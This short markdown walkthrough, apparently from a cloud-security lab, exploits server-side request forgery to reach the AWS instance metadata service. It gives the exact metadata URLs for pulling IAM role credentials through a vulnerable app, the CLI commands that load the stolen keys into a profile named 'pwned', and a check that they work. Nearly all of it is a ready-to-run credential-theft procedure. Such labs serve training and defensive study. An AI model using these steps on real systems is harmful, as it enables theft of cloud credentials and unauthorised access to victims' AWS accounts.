# IAM

## SSRF to IMDS Exploit

Prerequisites: The exposed app is vulnerable to SSRF

### 1) Get STS access key information 

    aws cloudformation describe-stacks --query "Stacks[?contains(StackName,'iam-initial-access')].Outputs"

### 2) Retrieve Instance Profile credentials:

Run this in the SSRF vulnerable component of the app

    http://169.254.169.254/latest/meta-data/iam/security-credentials/

### 3) Retrieve the ACTUAL credentials for the role name

    http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

### 4) Use the credentials in your AWS CLI

    aws configure set aws_access_key_id ACCESS_KEY_ID --profile pwned
    aws configure set aws_secret_access_key SECRET_ACCESS_KEY --profile pwned
    aws configure set aws_session_token SESSION_TOKEN --profile pwned

### 5) Verify

    aws sts get-caller-identity --profile pwned

